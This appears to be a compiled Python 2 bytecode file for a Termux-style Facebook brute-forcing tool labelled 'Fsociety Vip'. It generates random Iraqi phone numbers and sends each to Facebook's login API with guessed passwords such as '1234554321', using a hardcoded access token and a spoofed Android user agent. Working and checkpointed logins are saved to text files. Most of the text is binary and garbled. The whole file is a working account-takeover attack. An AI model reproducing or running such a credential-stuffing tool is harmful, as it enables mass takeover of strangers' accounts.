ó
7`c           @   sb  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qª Wy d  d l Z Wn e k
 re  j d  n Xy d  d l Z Wn8 e k
 ree  j d	  e j d
  e  j d  n Xd  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j  e!  e j" e j# j$   d d
 d g e _% d   Z& d   Z' d   Z( d   Z) d Z* d Z+ g  Z, g  a- g  a. g  Z/ d   Z0 d   Z1 e2 d k r^e0   n  d S(   iÿÿÿÿNs   rm -rf .txtiOÃ  iGô i s   .txtt   as   pip2 install requestss   pip2 install mechanizei   s   python2 nmbr.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   ost   syst   exit(    (    (    s   /sdcard/00.pyt   exb$   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/00.pyt   psb(   s    c           C   s   t  j d  d  S(   Ni   (   R   R   (    (    (    s   /sdcard/00.pyt   t.   s    c           C   s   t  j d  d  S(   Nt   clear(   R   t   system(    (    (    s   /sdcard/00.pyt   cb0   s    s  [90m
[92m------------------------------------------[90m
 Author   : Robot1616 , RobotVenom
 Discord  : Robot1616 , RobotVenom
 GitHub   : https://github.com/blak11
 Telegram : @Robot16_16
[92m------------------------------------------[90m
               i    c           C   s=   t  j d  t  j d  t GHd GHd GHd d GHt   d  S(   NR   s   figlet Fsociety Vips+   [1]  random Number [92m{ Free Mood }[90m s   [0]  Logaut           i*   s   [92m-[90m(   R   R   t   logot   action(    (    (    s   /sdcard/00.pyt   menu@   s    	c             sù  t  d  }  |  d k r' d GHt   nñ |  d k rö t j d  t GHd GHy t  d   t j d  t j d  d	 d
 t  d    d	 d
 d } x0 t | d  j   D] } t j | j	    q« WWqt
 k
 rò d GHt  d  t   qXn" |  d k rt   n d GHt   t t t   } d GHd	 d
 GHt d |  t j d  t d  t j d  d	 d
 GHH   f d   } t d  } | j | t  d d GHd GHd t t t   d t t t   GHd GHt  d  t j d  d  S(   Ns   
 Code :   t    s   [!] Fill in correctlyt   1R   s@   [1;92m                                        Toll Free ):[90ms   Ama bnusa ( +964 ) : s   figlet Fsociety Vipi*   s   [92m-[90ms]   [92m770 - 771 - 772 - 773
  750 - 751 - 752 - 753
    780 - 781 - 782 - 783


Code ? : [90ms   .txtt   rs   [!] File Not Founds	   
[ Back ]t   0t    s    Number All Iraq : g      à?s    Started Ples... : 15:00c            s©  |  } y t  j d  Wn t k
 r* n Xyp| } t j d    | d | d  } t j |  } d | k rå d    | d | d GHt d	 d
  } | j    | d | d  | j   t	 j
   | |  nµd | d k r`d    | d | GHt d d
  } | j    | d | d  | j   t j
   | |  n:d } t j d    | d | d  } t j |  } d | k rd    | d | d d GHt d	 d
  } | j    | d | d  | j   t	 j
   | |  n d | d k rd    | d | d GHt d d
  } | j    | d | d  | j   t j
   | |  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens   [1;92m[OK] s    | s   [0ms   save/successfull.txtR    t   |s   
s   www.facebook.comt	   error_msgs   [CP] s   save/checkpoint.txtt
   1234554321s   [1;92m[OK][0m (   R   t   mkdirt   OSErrort   brt   opent   jsont   loadR   t   closet   okst   appendt   cpb(   t   argt   usert   pass1t   datat   qt   okbt   cpst   pass2(   t   ct   k(    s   /sdcard/00.pyt   mainv   sL    '!
!
'!!
!
i   i2   t   -s     Process Has Been Completed ....s    Total OK/CP : t   /s-    CP File Has Been Saved : save/checkpoint.txts   
[Press Enter To Go Back]s   python2 .README.md(   t	   raw_inputR   R   R   R   R&   t	   readlinest   idR+   t   stript   IOErrorR   R	   t   strt   lenR   R   R   R   t   mapR*   R,   (   t   bcht   idlistt   linet   xxxR7   t   p(    (   R5   R6   s   /sdcard/00.pyR   L   sX    


	
	.	)
t   __main__(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](3   R   R   R   t   datetimet   randomt   hashlibt   ret	   threadingR'   t   urllibt	   cookielibt   getpassR   t   ranget   nt   randintt   nmbrR&   R
   R   t   requestst   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR%   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   R   R   R   t   backt
   successfulR,   R*   R<   R   R   t   __name__(    (    (    s   /sdcard/00.pyt   <module>   sN   
							a